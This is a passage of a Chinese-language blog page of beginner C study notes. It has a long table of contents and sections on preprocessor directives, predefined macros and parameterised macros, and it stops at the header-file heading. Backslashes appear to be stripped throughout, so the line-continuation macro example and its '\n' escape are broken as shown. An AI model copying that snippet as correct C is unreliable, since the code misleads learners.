<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>C 初级学习笔记（基础） - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">C 初级学习笔记（基础）</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="1.%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E6%8C%87%E4%BB%A4-toc" style="margin-left:0px"><a href="#1.%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E6%8C%87%E4%BB%A4">1.预处理器指令</a></p> 
<p id="%E9%A2%84%E5%AE%9A%E4%B9%89%E5%AE%8F-toc" style="margin-left:40px"><a href="#%E9%A2%84%E5%AE%9A%E4%B9%89%E5%AE%8F">预定义宏</a></p> 
<p id="%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E8%BF%90%E7%AE%97%E7%AC%A6%20%EF%BC%88%5C%EF%BC%89-toc" style="margin-left:80px"><a href="#%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E8%BF%90%E7%AE%97%E7%AC%A6%20%EF%BC%88%5C%EF%BC%89">预处理器运算符 （）</a></p> 
<p id="%E5%8F%82%E6%95%B0%E5%8C%96%E7%9A%84%E5%AE%8F-toc" style="margin-left:80px"><a href="#%E5%8F%82%E6%95%B0%E5%8C%96%E7%9A%84%E5%AE%8F">参数化的宏</a></p> 
<p id="%E5%A4%B4%E6%96%87%E4%BB%B6%20.h-toc" style="margin-left:40px"><a href="#%E5%A4%B4%E6%96%87%E4%BB%B6%20.h">头文件 .h</a></p> 
<p id="%E5%BC%95%E7%94%A8%E5%A4%B4%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-toc" style="margin-left:80px"><a href="#%E5%BC%95%E7%94%A8%E5%A4%B4%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">引用头文件操作</a></p> 
<p id="2.%E5%87%BD%E6%95%B0%EF%BC%88%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97%26%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%89%E5%AD%98%E5%82%A8%E7%B1%BB-toc" style="margin-left:0px"><a href="#2.%E5%87%BD%E6%95%B0%EF%BC%88%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97%26%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%89%E5%AD%98%E5%82%A8%E7%B1%BB">2.函数（标识符&amp;关键字&amp;运算符）存储类</a></p> 
<p id="%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0-toc" style="margin-left:80px"><a href="#%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0">函数参数</a></p> 
<p id="a.%20%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97-toc" style="margin-left:40px"><a href="#a.%20%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97">a. 标识符&amp;关键字</a></p> 
<p id="b.%20%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88%E7%AE%97%E6%9C%AF%E3%80%81%E5%85%B3%E7%B3%BB%E3%80%81%E9%80%BB%E8%BE%91%E3%80%81%E4%BD%8D%E3%80%81%E8%B5%8B%E5%80%BC%E3%80%81%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%EF%BC%89-toc" style="margin-left:40px"><a href="#b.%20%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88%E7%AE%97%E6%9C%AF%E3%80%81%E5%85%B3%E7%B3%BB%E3%80%81%E9%80%BB%E8%BE%91%E3%80%81%E4%BD%8D%E3%80%81%E8%B5%8B%E5%80%BC%E3%80%81%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%EF%BC%89">b. 运算符（算术、关系、逻辑、位、赋值、杂项/其它）</a></p> 
<p id="%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">算术运算符</a></p> 
<p id="%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6">关系运算符</a></p> 
<p id="%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">逻辑运算符</a></p> 
<p id="%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6">位运算符</a></p> 
<p id="%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6">赋值运算符</a></p> 
<p id="%C2%A0%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88sizeof%20%26%20%E4%B8%89%E5%85%83%EF%BC%89-toc" style="margin-left:80px"><a href="#%C2%A0%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88sizeof%20%26%20%E4%B8%89%E5%85%83%EF%BC%89"> 杂项/其它运算符（sizeof &amp; 三元）</a></p> 
<p id="%E6%89%A9%E5%B1%95%EF%BC%9A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7-toc" style="margin-left:80px"><a href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">扩展：运算符优先级</a></p> 
<p id="c.%20%E5%AD%98%E5%82%A8%E7%B1%BB-toc" style="margin-left:40px"><a href="#c.%20%E5%AD%98%E5%82%A8%E7%B1%BB">c. 存储类</a></p> 
<p id="1%E3%80%81auto%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E6%89%80%E6%9C%89%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E9%BB%98%E8%AE%A4%E7%9A%84%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%89-toc" style="margin-left:80px"><a href="#1%E3%80%81auto%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E6%89%80%E6%9C%89%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E9%BB%98%E8%AE%A4%E7%9A%84%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%89">1、auto 存储类（所有局部变量默认的存储类）</a></p> 
<p id="2%E3%80%81register%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E9%A2%91%E7%B9%81%E8%AE%BF%E9%97%AE%EF%BC%89-toc" style="margin-left:80px"><a href="#2%E3%80%81register%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E9%A2%91%E7%B9%81%E8%AE%BF%E9%97%AE%EF%BC%89">2、register 存储类（频繁访问）</a></p> 
<p id="3%E3%80%81static%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E4%B8%80%E6%AC%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E5%A4%9A%E6%AC%A1%E4%BD%BF%E7%94%A8%EF%BC%89-toc" style="margin-left:80px"><a href="#3%E3%80%81static%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E4%B8%80%E6%AC%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E5%A4%9A%E6%AC%A1%E4%BD%BF%E7%94%A8%EF%BC%89">3、static 存储类（一次初始化多次使用）</a></p> 
<p id="4%E3%80%81extern%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E5%85%A8%E5%B1%80%E5%BC%95%E7%94%A8%E5%A3%B0%E6%98%8E%EF%BC%89-toc" style="margin-left:80px"><a href="#4%E3%80%81extern%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E5%85%A8%E5%B1%80%E5%BC%95%E7%94%A8%E5%A3%B0%E6%98%8E%EF%BC%89">4、extern 存储类（全局引用声明）</a></p> 
<p id="d.%20%E8%BE%93%E5%85%A5%20%26%20%E8%BE%93%E5%87%BA-toc" style="margin-left:40px"><a href="#d.%20%E8%BE%93%E5%85%A5%20%26%20%E8%BE%93%E5%87%BA">d. 输入 &amp; 输出</a></p> 
<p id="1.%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6-toc" style="margin-left:80px"><a href="#1.%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">1.打开文件</a></p> 
<p id="2.%E5%85%B3%E9%97%AD%E6%96%87%E4%BB%B6-toc" style="margin-left:80px"><a href="#2.%E5%85%B3%E9%97%AD%E6%96%87%E4%BB%B6">2.关闭文件</a></p> 
<p id="3.%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-toc" style="margin-left:80px"><a href="#3.%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">3.写入文件</a></p> 
<p id="4.%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-toc" style="margin-left:80px"><a href="#4.%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">4.读取文件</a></p> 
<p id="e.%20%E9%80%92%E5%BD%92%EF%BC%88%E5%87%BD%E6%95%B0%E7%9A%84%20if%20%E5%A5%97%E5%A8%83%EF%BC%89-toc" style="margin-left:40px"><a href="#e.%20%E9%80%92%E5%BD%92%EF%BC%88%E5%87%BD%E6%95%B0%E7%9A%84%20if%20%E5%A5%97%E5%A8%83%EF%BC%89">e. 递归（函数的 if 套娃）</a></p> 
<p id="3.%E5%8F%98%E9%87%8F%26%E5%B8%B8%E9%87%8F%EF%BC%88%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%89-toc" style="margin-left:0px"><a href="#3.%E5%8F%98%E9%87%8F%26%E5%B8%B8%E9%87%8F%EF%BC%88%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%89">3.变量&amp;常量（数据的缓冲区）</a></p> 
<p id="%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2-toc" style="margin-left:40px"><a href="#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">强制类型转换</a></p> 
<p id="%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89%E5%92%8C%E5%A3%B0%E6%98%8E-toc" style="margin-left:40px"><a href="#%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89%E5%92%8C%E5%A3%B0%E6%98%8E">变量定义和声明</a></p> 
<p id="%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%88%E4%B8%BA%E4%BA%86%E9%81%BF%E5%85%8D%E4%B8%8D%E7%A1%AE%E5%AE%9A%E7%9A%84%E8%A1%8C%E4%B8%BA%2F%E9%94%99%E8%AF%AF%EF%BC%89-toc" style="margin-left:80px"><a href="#%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%88%E4%B8%BA%E4%BA%86%E9%81%BF%E5%85%8D%E4%B8%8D%E7%A1%AE%E5%AE%9A%E7%9A%84%E8%A1%8C%E4%B8%BA%2F%E9%94%99%E8%AF%AF%EF%BC%89">变量初始化（为了避免不确定的行为/错误）</a></p> 
<p id="C%20%E4%B8%AD%E7%9A%84%E5%B7%A6%E5%80%BC%EF%BC%88Lvalues%EF%BC%89%E5%92%8C%E5%8F%B3%E5%80%BC%EF%BC%88Rvalues%EF%BC%89-toc" style="margin-left:80px"><a href="#C%20%E4%B8%AD%E7%9A%84%E5%B7%A6%E5%80%BC%EF%BC%88Lvalues%EF%BC%89%E5%92%8C%E5%8F%B3%E5%80%BC%EF%BC%88Rvalues%EF%BC%89">C 中的左值（Lvalues）和右值（Rvalues）</a></p> 
<p id="-toc" style="margin-left:40px"></p> 
<p id="%E5%B8%B8%E9%87%8F%EF%BC%88%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%9C%9F%E4%B8%8D%E5%8F%98%E7%9A%84%E5%80%BC%EF%BC%89-toc" style="margin-left:80px"><a href="#%E5%B8%B8%E9%87%8F%EF%BC%88%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%9C%9F%E4%B8%8D%E5%8F%98%E7%9A%84%E5%80%BC%EF%BC%89">常量（程序运行期不变的值）</a></p> 
<p id="%E6%95%B0%E7%BB%84-toc" style="margin-left:40px"><a href="#%E6%95%B0%E7%BB%84">数组</a></p> 
<p id="%E5%A3%B0%E6%98%8E%E6%95%B0%E7%BB%84-toc" style="margin-left:80px"><a href="#%E5%A3%B0%E6%98%8E%E6%95%B0%E7%BB%84">声明数组</a></p> 
<p id="%E8%AE%BF%E9%97%AE%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0-toc" style="margin-left:80px"><a href="#%E8%AE%BF%E9%97%AE%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0">访问数组元素</a></p> 
<p id="enum%EF%BC%88%E6%9E%9A%E4%B8%BE%EF%BC%89-toc" style="margin-left:40px"><a href="#enum%EF%BC%88%E6%9E%9A%E4%B8%BE%EF%BC%89">enum（枚举）</a></p> 
<p id="%E6%8C%87%E9%92%88*%EF%BC%88%E9%80%9A%E5%B8%B8%E8%AF%B4%E7%9A%84%E6%98%AF%E6%8C%87%E5%90%91%E6%95%B4%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%8F%8A%E6%95%B0%E7%BB%84%E7%AD%89%E5%8F%98%E9%87%8F%EF%BC%89-toc" style="margin-left:40px"><a href="#%E6%8C%87%E9%92%88*%EF%BC%88%E9%80%9A%E5%B8%B8%E8%AF%B4%E7%9A%84%E6%98%AF%E6%8C%87%E5%90%91%E6%95%B4%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%8F%8A%E6%95%B0%E7%BB%84%E7%AD%89%E5%8F%98%E9%87%8F%EF%BC%89">指针*（通常说的是指向整型、字符型及数组等变量）</a></p> 
<p id="null%20%E6%8C%87%E9%92%88-toc" style="margin-left:80px"><a href="#null%20%E6%8C%87%E9%92%88">null 指针</a></p> 
<p id="%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%EF%BC%88%E6%8C%87%E5%90%91%E5%87%BD%E6%95%B0%E7%9A%84%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%EF%BC%89-toc" style="margin-left:80px"><a href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%EF%BC%88%E6%8C%87%E5%90%91%E5%87%BD%E6%95%B0%E7%9A%84%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%EF%BC%89">函数指针（指向函数的指针变量）</a></p> 
<p id="%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%A9%BA%E5%AD%97%E7%AC%A6%20%5C0%20%E7%BB%93%E5%B0%BE%E7%9A%84%E4%B8%80%E7%BB%B4%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%EF%BC%89-toc" style="margin-left:40px"><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%A9%BA%E5%AD%97%E7%AC%A6%20%5C0%20%E7%BB%93%E5%B0%BE%E7%9A%84%E4%B8%80%E7%BB%B4%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%EF%BC%89">字符串（使用空字符  结尾的一维字符数组）</a></p> 
<p id="%E7%BB%93%E6%9E%84%E4%BD%93-toc" style="margin-left:40px"><a href="#%E7%BB%93%E6%9E%84%E4%BD%93">结构体</a></p> 
<p id="%E8%AE%BF%E9%97%AE%E7%BB%93%E6%9E%84%E6%88%90%E5%91%98-toc" style="margin-left:80px"><a href="#%E8%AE%BF%E9%97%AE%E7%BB%93%E6%9E%84%E6%88%90%E5%91%98">访问结构成员</a></p> 
<p id="%E6%8C%87%E5%90%91%E7%BB%93%E6%9E%84%E7%9A%84%E6%8C%87%E9%92%88-toc" style="margin-left:80px"><a href="#%E6%8C%87%E5%90%91%E7%BB%93%E6%9E%84%E7%9A%84%E6%8C%87%E9%92%88">指向结构的指针</a></p> 
<p id="%E7%BB%93%E6%9E%84%E4%BD%93%E5%A4%A7%E5%B0%8F%E7%9A%84%E8%AE%A1%E7%AE%97-toc" style="margin-left:80px"><a href="#%E7%BB%93%E6%9E%84%E4%BD%93%E5%A4%A7%E5%B0%8F%E7%9A%84%E8%AE%A1%E7%AE%97">结构体大小的计算</a></p> 
<p id="%E5%85%B1%E7%94%A8%E4%BD%93-toc" style="margin-left:40px"><a href="#%E5%85%B1%E7%94%A8%E4%BD%93">共用体</a></p> 
<p id="%E8%AE%BF%E9%97%AE%E5%85%B1%E7%94%A8%E4%BD%93%E6%88%90%E5%91%98-toc" style="margin-left:80px"><a href="#%E8%AE%BF%E9%97%AE%E5%85%B1%E7%94%A8%E4%BD%93%E6%88%90%E5%91%98">访问共用体成员</a></p> 
<p id="%E4%BD%8D%E5%9F%9F%EF%BC%88%E7%89%B9%E6%AE%8A%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E6%88%90%E5%91%98%EF%BC%89-toc" style="margin-left:40px"><a href="#%E4%BD%8D%E5%9F%9F%EF%BC%88%E7%89%B9%E6%AE%8A%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E6%88%90%E5%91%98%EF%BC%89">位域（特殊的结构体成员）</a></p> 
<p id="%E4%B8%BA%E7%B1%BB%E5%9E%8B%E5%8F%96%E4%B8%AA%E6%96%B0%E5%90%8D%E5%AD%97%20%E2%80%94%E2%80%94%20typedef-toc" style="margin-left:40px"><a href="#%E4%B8%BA%E7%B1%BB%E5%9E%8B%E5%8F%96%E4%B8%AA%E6%96%B0%E5%90%8D%E5%AD%97%20%E2%80%94%E2%80%94%20typedef">为类型取个新名字 —— typedef</a></p> 
<p id="%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0-toc" style="margin-left:40px"><a href="#%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0">可变参数</a></p> 
<p id="4.%E8%AF%AD%E5%8F%A5%26%E8%A1%A8%E8%BE%BE%E5%BC%8F-toc" style="margin-left:0px"><a href="#4.%E8%AF%AD%E5%8F%A5%26%E8%A1%A8%E8%BE%BE%E5%BC%8F">4.语句&amp;表达式</a></p> 
<p id="A.%E5%88%A4%E6%96%AD-toc" style="margin-left:40px"><a href="#A.%E5%88%A4%E6%96%AD">A.判断</a></p> 
<p id="%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5-toc" style="margin-left:80px"><a href="#%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5">判断语句</a></p> 
<p id="%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">三元运算符</a></p> 
<p id="B.%E5%BE%AA%E7%8E%AF-toc" style="margin-left:40px"><a href="#B.%E5%BE%AA%E7%8E%AF">B.循环</a></p> 
<p id="%E5%BE%AA%E7%8E%AF%E7%B1%BB%E5%9E%8B-toc" style="margin-left:80px"><a href="#%E5%BE%AA%E7%8E%AF%E7%B1%BB%E5%9E%8B">循环类型</a></p> 
<p id="%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5-toc" style="margin-left:80px"><a href="#%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5">循环控制语句</a></p> 
<p id="%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF-toc" style="margin-left:80px"><a href="#%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF">无限循环</a></p> 
<p id="C.%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86-toc" style="margin-left:40px"><a href="#C.%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">C.错误处理</a></p> 
<p id="errno%E3%80%81perror()%20%E5%92%8C%20strerror()-toc" style="margin-left:80px"><a href="#errno%E3%80%81perror%28%29%20%E5%92%8C%20strerror%28%29">errno、perror() 和 strerror()</a></p> 
<p id="%E7%A8%8B%E5%BA%8F%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81-toc" style="margin-left:80px"><a href="#%E7%A8%8B%E5%BA%8F%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81">程序退出状态</a></p> 
<p id="5.%E6%B3%A8%E9%87%8A%26%E7%A9%BA%E6%A0%BC%E5%8F%8A%E8%A1%A5%E5%85%85%EF%BC%88%E9%83%BD%E4%BC%9A%E8%A2%AB%E7%BC%96%E8%AF%91%E5%99%A8%E7%BB%99%E5%BF%BD%E7%95%A5%E6%8E%89%EF%BC%89-toc" style="margin-left:0px"><a href="#5.%E6%B3%A8%E9%87%8A%26%E7%A9%BA%E6%A0%BC%E5%8F%8A%E8%A1%A5%E5%85%85%EF%BC%88%E9%83%BD%E4%BC%9A%E8%A2%AB%E7%BC%96%E8%AF%91%E5%99%A8%E7%BB%99%E5%BF%BD%E7%95%A5%E6%8E%89%EF%BC%89">5.注释&amp;空格及补充（都会被编译器给忽略掉）</a></p> 
<p id="%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%A7%84%E5%88%99-toc" style="margin-left:40px"><a href="#%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%A7%84%E5%88%99">作用域规则</a></p> 
<p id="%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F-toc" style="margin-left:80px"><a href="#%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F">局部变量</a></p> 
<p id="%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-toc" style="margin-left:80px"><a href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">全局变量</a></p> 
<p id="%E5%BD%A2%E5%BC%8F%E5%8F%82%E6%95%B0-toc" style="margin-left:80px"><a href="#%E5%BD%A2%E5%BC%8F%E5%8F%82%E6%95%B0">形式参数</a></p> 
<p id="%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E5%92%8C%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-toc" style="margin-left:80px"><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E5%92%8C%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">初始化局部变量和全局变量</a></p> 
<p id="%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-toc" style="margin-left:40px"><a href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86">内存管理</a></p> 
<p id="%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98-toc" style="margin-left:80px"><a href="#%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98">动态分配内存</a></p> 
<p id="%E9%87%8D%E6%96%B0%E8%B0%83%E6%95%B4%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98-toc" style="margin-left:80px"><a href="#%E9%87%8D%E6%96%B0%E8%B0%83%E6%95%B4%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98">重新调整内存大小和释放内存</a></p> 
<p id="C%20%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%87%BD%E6%95%B0%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6-toc" style="margin-left:80px"><a href="#C%20%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%87%BD%E6%95%B0%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6">C 语言中常用的内存管理函数和运算符</a></p> 
<p id="%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0-toc" style="margin-left:40px"><a href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0">命令行参数</a></p> 
<hr id="hr-toc"> 
<p></p> 
<p>C 程序结构，主要分为以下部分：</p> 
<h2 id="1.%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E6%8C%87%E4%BB%A4">1.预处理器指令</h2> 
<p><strong>预处理器</strong>不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。我们将把 C 预处理器（C Preprocessor）简写为 CPP。</p> 
<p>所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。</p> 
<blockquote> 
 <p>#include 用来引入头文件</p> 
 <pre><code class="language-cpp">#include &lt;stdio.h&gt;
或
#include "stdio.h"</code></pre> 
 <p>#define 预先定义</p> 
 <pre><code class="language-cpp">#define PI 3.14</code></pre> 
</blockquote> 
<p>常看下表：</p> 
<table><tbody>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
<tr>
<td>#define</td>
<td>定义宏</td>
</tr>
<tr>
<td>#include</td>
<td>包含一个源代码文件</td>
</tr>
<tr>
<td>#undef</td>
<td>取消已定义的宏</td>
</tr>
<tr>
<td>#ifdef</td>
<td>如果宏已经定义，则返回真</td>
</tr>
<tr>
<td>#ifndef</td>
<td>如果宏没有定义，则返回真</td>
</tr>
<tr>
<td>#if</td>
<td>如果给定条件为真，则编译下面代码</td>
</tr>
<tr>
<td>#else</td>
<td>#if 的替代方案</td>
</tr>
<tr>
<td>#elif</td>
<td>如果前面的 #if 给定条件不为真，当前条件为真，则编译下面代码</td>
</tr>
<tr>
<td>#endif</td>
<td>结束一个 #if……#else 条件编译块</td>
</tr>
<tr>
<td>#error</td>
<td>当遇到标准错误时，输出错误消息</td>
</tr>
<tr>
<td>#pragma</td>
<td>使用标准化方法，向编译器发布特殊的命令到编译器中</td>
</tr>
</tbody></table> 
<p></p> 
<h3 id="%E9%A2%84%E5%AE%9A%E4%B9%89%E5%AE%8F">预定义宏</h3> 
<table><tbody>
<tr>
<th>宏</th>
<th>描述</th>
</tr>
<tr>
<td>__DATE__</td>
<td>当前日期，一个以 "MMM DD YYYY" 格式表示的字符常量。</td>
</tr>
<tr>
<td>__TIME__</td>
<td>当前时间，一个以 "HH:MM:SS" 格式表示的字符常量。</td>
</tr>
<tr>
<td>__FILE__</td>
<td>这会包含当前文件名，一个字符串常量。</td>
</tr>
<tr>
<td>__LINE__</td>
<td>这会包含当前行号，一个十进制常量。</td>
</tr>
<tr>
<td>__STDC__</td>
<td>当编译器以 ANSI 标准编译时，则定义为 1。</td>
</tr>
</tbody></table> 
<p><span style="color:#7b7f82">（在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏）</span></p> 
<h4 id="%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E8%BF%90%E7%AE%97%E7%AC%A6%20%EF%BC%88%5C%EF%BC%89">预处理器运算符 （）</h4> 
<p>一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（）</p> 
<pre><code class="language-cpp">#define  message_for(a, b)  
    printf(#a " and " #b ": We love you!n")

</code></pre> 
<h4 id="%E5%8F%82%E6%95%B0%E5%8C%96%E7%9A%84%E5%AE%8F">参数化的宏</h4> 
<p>CPP 一个强大的功能是可以使用参数化的宏来模拟函数</p> 
<pre><code class="language-cpp">int square(int x) {
   return x * x;
}
//下面用宏重写了上面的代码
#define square(x) ((x) * (x))
</code></pre> 
<p><span style="color:#7b7f82"><em>（注意！在使用带有参数的宏之前，必须使用 <strong>#define</strong> 指令定义。参数列表是括在圆括号内，且必须紧跟在宏名称的后边。宏名称和左圆括号之间不允许有空格）</em></span></p> 
<p></p> 
<h3 id="%E5%A4%B4%E6%96%87%E4%BB%B6%20.h">头文件 .h</h3> 
